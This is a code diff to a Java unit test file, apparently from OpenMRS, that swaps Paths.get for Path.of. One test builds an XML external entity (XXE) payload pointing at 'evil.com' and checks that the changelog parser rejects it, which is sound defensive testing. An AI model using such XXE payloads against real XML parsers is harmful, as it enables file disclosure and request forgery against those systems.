@@ -22,7 +22,6 @@ import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.nio.file.Paths;
 
 import org.dom4j.DocumentException;
 import org.junit.jupiter.api.BeforeEach;
@@ -37,7 +36,7 @@ public class AbstractSnapshotTunerTest {
 	
 	private static final String HTTP_OPENMRS_ORG_LICENSE = "http://openmrs.org/license";
 	
-	private static String PATH_TO_TEST_RESOURCES = Paths.get("src", "test", "resources").toString();
+	private static String PATH_TO_TEST_RESOURCES = Path.of("src", "test", "resources").toString();
 	
 	/*
 	 * An instance of org.openmrs.liquibase.SchemaOnlyTuner is used to test behaviour implemented in the 
@@ -79,7 +78,7 @@ public class AbstractSnapshotTunerTest {
 		
 		//  when
 		String actual = schemaOnlyTuner
-		        .addLicenseHeaderToFileContent(Paths.get(PATH_TO_TEST_RESOURCES, FILE_WITHOUT_LICENSE_HEADER_MD).toString());
+		        .addLicenseHeaderToFileContent(Path.of(PATH_TO_TEST_RESOURCES, FILE_WITHOUT_LICENSE_HEADER_MD).toString());
 		
 		// then
 		assertTrue(actual.contains(HTTP_OPENMRS_ORG_LICENSE));
@@ -88,7 +87,7 @@ public class AbstractSnapshotTunerTest {
 	@Test
 	public void shouldCreateUpdatedChangeLogFile(@TempDir Path tempDir) throws IOException {
 		// given
-		Path sourcePath = Paths.get(PATH_TO_TEST_RESOURCES + File.separator + FILE_WITHOUT_LICENSE_HEADER_MD);
+		Path sourcePath = Path.of(PATH_TO_TEST_RESOURCES + File.separator + FILE_WITHOUT_LICENSE_HEADER_MD);
 		Path targetPath = tempDir.resolve("file-to-add-license-header-to.txt");
 		
 		Files.copy(sourcePath, targetPath, REPLACE_EXISTING);
@@ -106,7 +105,7 @@ public class AbstractSnapshotTunerTest {
 	}
 	
 	private String readFile(String path) throws IOException {
-		File file = Paths.get(path).toFile();
+		File file = Path.of(path).toFile();
 		return readFile(file);
 	}
 	
@@ -130,7 +129,7 @@ public class AbstractSnapshotTunerTest {
 	@Test
 	public void testReadChangeLogFile_shouldThrowDocumentExceptionIncaseOfAnXxeAttack() throws Exception {
 		String xmlContent = "<!DOCTYPE root [<!ENTITY ext SYSTEM \"http://evil.com/payload\">]><root>&ext;</root>";
-		Path tempFilePath = Paths.get("test.xml");
+		Path tempFilePath = Path.of("test.xml");
 		Files.write(tempFilePath, xmlContent.getBytes());
 		
 		assertThrows(DocumentException.class, () -> AbstractSnapshotTuner.readChangeLogFile(String.valueOf(tempFilePath)));
